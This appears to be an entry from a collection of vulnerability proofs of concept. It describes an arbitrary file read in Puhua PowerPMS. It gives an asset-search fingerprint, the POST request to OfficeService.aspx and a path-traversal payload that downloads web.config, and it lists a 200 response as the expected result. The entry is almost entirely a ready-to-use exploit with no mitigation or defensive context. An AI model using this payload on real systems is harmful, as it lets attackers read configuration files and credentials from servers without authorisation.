# 普华PMSOfficeService存在任意文件读取漏洞

- **系统**：普华　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="普华科技-PowerPMS"`
- **请求**：`POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
action=download&WEBURL=app_data/../web.config
```
- **预期**：200　|　—